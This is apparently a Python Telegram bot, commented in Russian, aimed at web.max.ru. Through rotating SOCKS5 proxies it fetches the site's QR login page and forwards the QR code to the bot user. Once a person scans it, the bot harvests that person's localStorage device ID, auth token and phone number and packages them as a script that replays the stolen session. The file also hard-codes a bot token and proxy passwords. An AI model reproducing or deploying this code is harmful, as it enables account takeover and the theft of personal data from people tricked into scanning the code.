"""
Telegram бот для max.ru - ФАЙЛ С НОМЕРОМ АККАУНТА + РАНДОМНЫЕ SOCKS5 ПРОКСИ
"""

import logging
import asyncio
import random
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import json
import re
import os

# ==================== ТВОЙ ТОКЕН ====================
TOKEN = "8556187422:AAF0vIA4vsW9JIGlgHGv48Se6AysSUB4e10"
URL = "https://web.max.ru"

# ==================== ТВОИ SOCKS5 ПРОКСИ ====================
PROXIES = [
    "185.181.246.198:9101:SP8lc12fs5:Zmgff17J",
    "45.15.72.253:9101:SP8lc12fs5:Zmgff17J",
    "45.11.20.108:9101:SP8lc12fs5:Zmgff17J"
]
# ====================================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Глобальный драйвер
driver = None
user_sessions = {}
current_proxy = None

def get_random_proxy():
    """Возвращает случайный прокси из списка"""
    return random.choice(PROXIES)

def create_driver_with_socks5_proxy(proxy_string):
    """Создает драйвер с SOCKS5 прокси"""
    options = Options()
    
    # Парсим прокси
    ip, port, login, password = proxy_string.split(':')
    
    # Настройки для SOCKS5 прокси с авторизацией
    proxy_config = f"--proxy-server=socks5://{login}:{password}@{ip}:{port}"
    
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-extensions')
    options.add_argument('--window-size=800x600')
    options.add_argument('--blink-settings=imagesEnabled=false')
    options.add_argument(proxy_config)
    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    options.page_load_strategy = 'eager'
    
    # Отключаем загрузку картинок
    prefs = {
        'profile.default_content_setting_values': {
            'images': 2,
        }
    }
    options.add_experimental_option('prefs', prefs)
    
    # Используем webdriver-manager для автоматической загрузки драйвера
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        logger.info(f"✅ Драйвер успешно создан для прокси {ip}")
        return driver
    except Exception as e:
        logger.error(f"❌ Ошибка создания драйвера: {e}")
        raise e

def extract_phone_number(auth_data):
    """
    Пытается извлечь номер телефона из auth данных
    """
    try:
        # Если auth_data это строка, парсим JSON
        if isinstance(auth_data, str):
            data = json.loads(auth_data)
        else:
            data = auth_data
        
        # Ищем номер телефона в разных полях
        phone = None
        
        # Проверяем поле phone
        if 'phone' in data:
            phone = data['phone']
        # Проверяем поле phoneNumber
        elif 'phoneNumber' in data:
            phone = data['phoneNumber']
        # Проверяем вложенные объекты
        elif 'user' in data and isinstance(data['user'], dict):
            if 'phone' in data['user']:
                phone = data['user']['phone']
        # Проверяем viewerId или другие идентификаторы
        elif 'viewerId' in data:
            phone = str(data['viewerId'])
        # Проверяем token на наличие номера
        elif 'token' in data:
            token = data['token']
            # Ищем номер телефона в токене (10-11 цифр подряд)
            phone_match = re.search(r'\d{10,11}', token)
            if phone_match:
                phone = phone_match.group()
        
        # Если нашли номер, очищаем его от лишних символов
        if phone:
            # Оставляем только цифры
            phone = re.sub(r'\D', '', str(phone))
            # Если номер длинный, берем последние 10 цифр
            if len(phone) > 10:
                phone = phone[-10:]
            return phone
        
        return None
    except Exception as e:
        logger.error(f"Ошибка извлечения номера: {e}")
        return None

async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Быстрое получение QR через случайный SOCKS5 прокси"""
    global driver, current_proxy
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("⚡️ Получаю QR-код через SOCKS5 прокси...")
    
    try:
        # Закрываем старый драйвер если есть
        if driver:
            try:
                driver.quit()
            except:
                pass
        
        # Выбираем случайный прокси
        current_proxy = get_random_proxy()
        ip = current_proxy.split(':')[0]
        
        await msg.edit_text(f"🔄 Использую SOCKS5 прокси: {ip}...\n⏳ Загружаю драйвер...")
        
        # Создаем драйвер с SOCKS5 прокси
        driver = create_driver_with_socks5_proxy(current_proxy)
        
        # Загружаем страницу
        await msg.edit_text(f"🔄 Загружаю страницу через прокси {ip}...")
        driver.get(URL)
        time.sleep(5)
        
        # Делаем скриншот
        screenshot = driver.get_screenshot_as_png()
        img_io = BytesIO(screenshot)
        img_io.name = "qr.png"
        
        await msg.delete()
        await update.message.reply_photo(
            photo=InputFile(img_io, filename="qr.png"),
            caption=f"✅ **QR-код готов через SOCKS5 прокси {ip}!**\n\n👉 /file - после входа",
            parse_mode='Markdown'
        )
        
        user_sessions[user_id] = {
            'proxy': current_proxy,
            'ip': ip
        }
        logger.info(f"QR отправлен пользователю {user_id} через прокси {ip}")
        
    except Exception as e:
        logger.error(f"❌ Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка с прокси: {str(e)[:200]}")
        if driver:
            try:
                driver.quit()
            except:
                pass
            driver = None

async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла со скриптом с номером в названии"""
    global driver
    user_id = str(update.effective_user.id)
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сначала используй /qr")
        return
    
    if not driver:
        await update.message.reply_text("❌ Браузер не активен. Используй /qr")
        return
    
    msg = await update.message.reply_text("📁 Получаю данные...")
    
    try:
        # Получаем данные из localStorage
        data = driver.execute_script("""
            return {
                deviceId: localStorage.getItem('__oneme_device_id'),
                auth: localStorage.getItem('__oneme_auth')
            };
        """)
        
        if data and data['deviceId'] and data['auth']:
            # Парсим auth
            try:
                auth_data = json.loads(data['auth'])
            except:
                auth_data = {"token": data['auth'], "viewerId": "unknown"}
            
            # Пытаемся извлечь номер телефона
            phone_number = extract_phone_number(auth_data)
            
            # Форматируем JSON красиво
            auth_str = json.dumps(auth_data, indent=2, ensure_ascii=False)
            
            # Создаем скрипт
            script = f"""sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{data['deviceId']}');
localStorage.setItem('__oneme_auth', JSON.stringify({auth_str}));
window.location.reload();"""
            
            # Определяем имя файла
            if phone_number:
                filename = f"{phone_number}.txt"
                caption_text = f"✅ Файл для номера {phone_number}"
            else:
                # Если номер не найден, используем deviceId
                filename = f"{data['deviceId'][:8]}.txt"
                caption_text = "✅ Файл готов (номер не найден)"
            
            # Создаем файл
            file_bytes = BytesIO(script.encode('utf-8'))
            file_bytes.name = filename
            
            await msg.delete()
            await update.message.reply_document(
                document=InputFile(file_bytes, filename=filename),
                caption=caption_text
            )
            
            # Показываем какой прокси использовался
            proxy_info = user_sessions[user_id]
            await update.message.reply_text(f"🌐 Использован SOCKS5 прокси: {proxy_info['ip']}")
            
            logger.info(f"Файл {filename} отправлен пользователю {user_id} через прокси {proxy_info['ip']}")
            
            # Закрываем браузер
            if driver:
                driver.quit()
                driver = None
            del user_sessions[user_id]
        else:
            await msg.edit_text(
                "❌ Вход не выполнен\n\n"
                "1️⃣ Отсканируй QR\n"
                "2️⃣ Войди на сайт\n"
                "3️⃣ Попробуй /file еще раз"
            )
            
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {e}")

async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать список SOCKS5 прокси"""
    text = "📋 **Список SOCKS5 прокси:**\n\n"
    for i, proxy in enumerate(PROXIES, 1):
        ip = proxy.split(':')[0]
        text += f"{i}. `{ip}:9101` (SOCKS5 с авторизацией)\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def test_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Тестирует прокси"""
    msg = await update.message.reply_text("🔄 Тестирую прокси...")
    
    results = []
    for proxy in PROXIES:
        ip = proxy.split(':')[0]
        try:
            # Пробуем создать драйвер с прокси
            test_driver = create_driver_with_socks5_proxy(proxy)
            test_driver.quit()
            results.append(f"✅ {ip}: работает")
        except:
            results.append(f"❌ {ip}: не работает")
    
    text = "📊 **Результаты тестирования:**\n\n" + "\n".join(results)
    await msg.edit_text(text, parse_mode='Markdown')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    await update.message.reply_text(
        "👋 **Бот для max.ru**\n\n"
        "⚡️ **/qr** - получить QR через случайный SOCKS5 прокси\n"
        "📁 **/file** - получить файл с номером\n"
        "📋 **/proxies** - список прокси\n"
        "🔧 **/test** - проверить прокси\n"
        "🔄 **/reset** - сбросить браузер\n\n"
        f"🌐 Всего SOCKS5 прокси: {len(PROXIES)}",
        parse_mode='Markdown'
    )

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Сброс браузера"""
    global driver
    user_id = str(update.effective_user.id)
    
    if driver:
        try:
            driver.quit()
        except:
            pass
        driver = None
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    
    await update.message.reply_text("✅ Браузер сброшен")

def main():
    """Запуск бота"""
    print("="*60)
    print("⚡️ ЗАПУСК БОТА С RANDOM SOCKS5 ПРОКСИ")
    print("="*60)
    print(f"📊 Загружено SOCKS5 прокси: {len(PROXIES)}")
    for i, proxy in enumerate(PROXIES, 1):
        ip = proxy.split(':')[0]
        print(f"   {i}. {ip}:9101")
    print("="*60)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("qr", qr_command))
    app.add_handler(CommandHandler("file", file_command))
    app.add_handler(CommandHandler("reset", reset_command))
    app.add_handler(CommandHandler("proxies", proxies_command))
    app.add_handler(CommandHandler("test", test_proxy_command))
    
    print("✅ Бот готов!")
    print("📱 Команды: /qr /file /proxies /test /reset")
    print("="*60)
    
    app.run_polling()

if __name__ == "__main__":
    main()
